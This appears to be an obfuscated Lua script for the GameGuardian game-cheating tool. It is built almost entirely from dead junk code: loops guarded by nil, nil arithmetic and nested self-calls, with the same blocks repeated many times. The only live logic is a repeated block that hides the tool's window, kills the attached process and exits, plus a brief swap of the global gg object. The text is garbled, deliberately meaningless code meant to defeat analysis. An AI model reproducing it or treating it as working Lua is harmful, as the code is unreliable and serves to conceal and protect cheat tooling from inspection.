for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
tg = gg
gg = nil
while (gg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
gg =tg
tg = nil
